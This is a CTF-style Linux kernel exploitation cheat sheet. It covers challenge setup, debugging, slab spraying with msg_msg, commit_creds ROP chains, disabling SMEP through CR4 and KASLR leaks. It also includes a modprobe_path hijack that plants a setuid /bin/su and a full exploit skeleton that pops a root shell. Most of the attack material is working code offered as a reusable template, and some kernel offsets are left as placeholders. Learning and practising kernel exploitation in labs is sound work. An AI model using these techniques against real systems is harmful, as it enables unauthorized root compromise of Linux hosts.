# Kernel Pwn

## Environment Setup

Typical kernel challenge package:

```text
kernel/
├── bzImage          # compressed kernel image
├── vmlinux          # uncompressed kernel (with symbols, for gdb)
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # vulnerable driver
├── run.sh           # qemu startup script
└── (.config)        # build config, optional
```

### Unpack initramfs and Modify the init Script

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# or newc format:
# cpio -idm < ../initramfs.cpio

# modify init to get root (for CTF learning; real challenges usually setuid 1000)
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# or comment out the user-switch line

# repack
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### Extract vmlinux (when only bzImage is given)

```bash
# use the extract-vmlinux script (kernel source scripts/)
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU Startup Parameter Template

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # open gdb port 1234
```

Protections corresponding to the key parameters:

| Parameter | Meaning | Exploitation impact |
|------|------|---------|
| `+smep` | kernel cannot execute user-mode code | must use ROP; cannot jump to user-mode shellcode |
| `+smap` | kernel cannot access user-mode data | ROP chain cannot live in user mode; must be in kernel mode (heap spray / msgsnd) |
| `+pku` | Protection Keys | similar to SMAP |
| `nokaslr` | KASLR disabled | function addresses fixed |
| `kaslr` | KASLR enabled | must leak |
| `pti=on` | KPTI (Meltdown fix) | returning to user mode needs swapgs_restore_regs_and_return_to_usermode |

### Debugging

```bash
# terminal 1
./run.sh   # with -s

# terminal 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

For GEF, use the fork maintained by bata24; it has dedicated pretty-printers for kernel structs.

## Vulnerability Type Branching

| Vulnerability | Typical source | Exploitation baseline |
|------|---------|---------|
| kernel stack overflow | copy_from_user with controllable length | stack canary + KASLR → ROP |
| kernel heap overflow | kmalloc slab out-of-bounds write | slab spray + overwrite adjacent object |
| UAF | refcount error / double free | reallocate the same slab → control the freed object |
| integer overflow | size computation overflow → small alloc, large copy | actually an overflow, same as above |
| TOCTOU | second dereference of a user pointer | userfaultfd / FUSE to stall |
| race | two threads doing ioctl simultaneously | win the timing window |
| arbitrary read/write | already the ultimate primitive | directly change cred / modprobe_path |

## Slab Spraying (core of heap pwn)

Spray controllable-size kernel objects into the vulnerable slab to overwrite the target object.

| slab size | Spray object | Advantage |
|-----------|---------|------|
| kmalloc-64 / 96 | `seq_operations` | has function pointers; overwrite = control IP |
| kmalloc-1024 | `tty_struct` | has ops pointer; clean structure |
| kmalloc-4096 | `pipe_buffer` | mainstay in modern versions; still works on 6.x |
| any size | `msg_msg` | controllable size (8 - 4096+); sysv msgsnd controls data |
| kmalloc-128 | `user_key_payload` | keyctl family of interfaces |

### msg_msg Spray Example

```c
// user-mode trigger
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // plus the msg_msg header 0x30 = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // spray into kmalloc-128
// ... trigger the vuln to overwrite
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // read back to see if it changed → leak
```

## Privilege Escalation Paths

### 1. commit_creds(prepare_kernel_cred(0)) ROP

Classic and universal. Prerequisite: control RIP (stack overflow / vtable hijack).

```c
// user-mode ROP chain
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // → returns root cred in rax
    pop_rdi,                          // pop rdi; ret
    /* placeholder, overwritten by the mov below */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // move rax→rdi (some need a dedicated gadget)
    commit_creds,                     // set current process cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // skip the push sequence
    0, 0,                             // rax, rdi placeholders
    user_rip,                         // user-mode return function (saved cs/ss)
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**Key gadgets** (find in vmlinux with ROPgadget):

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

Must save cs/ss/rflags/rsp before returning to user mode:

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. modprobe_path → /tmp/x (least effort)

```text
Principle:
  - the kernel global variable modprobe_path defaults to "/sbin/modprobe"
  - when execve runs a file with an unknown magic, the kernel invokes modprobe_path as root
  - change it to "/tmp/x", write /tmp/x (chmod +x), trigger execution of unknown magic
  
Applies: when you have an arbitrary-write primitive but can't necessarily ROP
```

```c
// 1. prepare the payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. prepare the trigger file
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. vuln write: change modprobe_path to "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. trigger
system("/tmp/trigger");
// the kernel runs /tmp/x as root, which does chmod +s /bin/su

// 5. use the setuid binary
system("/bin/su");
```

**modprobe_path address source**: symbol in vmlinux, or /proc/kallsyms (if kptr_restrict=0).

### 3. core_pattern hijack

```text
Similar idea: /proc/sys/kernel/core_pattern controls the coredump handler
Change it to "|/tmp/x %P" so it's invoked when a process crashes
Downside: needs to trigger a coredump; clunkier than modprobe_path
```

### 4. Kernel ROP to Disable SMEP/SMAP

If you really want to jump back to user-mode shellcode (for learning), ROP to clear the cr4 bits:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// after clearing SMEP+SMAP, jumping to user-mode shellcode works
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // desired CR4 value (SMEP/SMAP bits removed)
    mov_cr4_rdi,            // something like "mov cr4, rdi; pop rbp; ret"
    0,
    user_shellcode_addr,    // jump there (this fails if SMEP is still on)
};
```

In practice **real exploits basically never take this route** — a direct commit_creds ROP is shorter and more reliable.

## KASLR Leak Channels

| Source | Restriction | Notes |
|------|------|------|
| /proc/kallsyms | real addresses only with `kptr_restrict=0` | often open in CTF |
| /sys/module/.../sections/.text | same as above | module base |
| dmesg | readable only with `dmesg_restrict=0` | oops leaks addresses |
| uninitialized kernel stack read | the vuln itself must support arbitrary read | residual addresses |
| msg_msg + vuln leak | spray then OOB read | generic |
| side channels (Meltdown/Spectre) | KPTI fixed Meltdown | not generic |
| SIDT/SGDT user-mode instructions | may leak on old kernels | mostly closed on modern ones |

```c
// classic: read from /proc/kallsyms
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // offset per vmlinux
```

## Full Exploit Template (user-mode + ioctl trigger + ROP privesc + shell)

```c
// exploit.c — generic kernel pwn skeleton
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base (leak first, or hardcode when nokaslr) ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. leak KASLR base (assume /proc/kallsyms is readable here, or write your own leak primitive)
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. build the ROP (on the user stack or on a sprayed fake stack)
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // temp user rsp, can point high into the mmap
    rop[i++] = user_ss;

    // 3. trigger the vuln so kernel RIP lands on rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // challenge-specific: ioctl / write / read

    return 0;
}
```

## Learning Reference: CVE-2022-0185

```text
Vuln: fs/fs_context.c legacy_parse_param has a signed/unsigned length confusion
      → kmalloc heap buffer overflow, arbitrary size, arbitrary data

Why it's a good learning sample:
1. no root needed to trigger (unprivileged user namespace)
2. overflow size fully controllable
3. public complete writeup + PoC
4. combines: user_ns exploitation, msg_msg spraying, UAF reoccupation, cross-cache exploitation

Learning path:
1. build a kernel with CONFIG_USER_NS=y
2. run the original PoC from Crusaders of Rust: https://www.openwall.com/lists/oss-security/2022/01/18/7
3. read the official writeup on willsroot.io (the version archived by PortSwigger)
4. rewrite it manually: change the msg_msg spray to a pipe_buffer spray (practice a different slab path)
5. add a KASLR leak (the original uses /proc/kallsyms; in a challenge version disable it and switch to OOB read)
```

How the main techniques map to this document's sections:

- Vulnerability type → "kernel heap overflow"
- Spray object → "msg_msg spraying"
- Privilege escalation method → "commit_creds ROP" or "modprobe_path"
- KASLR leak → "/proc/kallsyms" or "msg_msg + vuln leak"

## Notes

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** randomize the kernel stack base by 0-1023 on every syscall, breaking any exploit that relies on a fixed stack offset
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** randomize object allocation within a slab, lowering spray success; spray more
- **CONFIG_STATIC_USERMODEHELPER** makes modprobe_path a read-only `static_usermodehelper_path`; the modprobe attack fails
- **KPTI** separates user/kernel page tables; returning to user mode must go through the `swapgs_restore_regs_and_return_to_usermode` trampoline — a bare swapgs+iretq won't work
- **FG-KASLR** (function-granular KASLR) randomizes at function granularity; you need to leak multiple symbols to derive each function's offset
- **CET / IBT** (Intel control-flow enforcement) requires indirect jumps to land on ENDBR instructions; some gadgets break
- **don't debug by calling printk in the kernel** — serial IO changes timing and breaks races; use a magic register value (rcx=0xdeadbeef) + a gdb watch instead

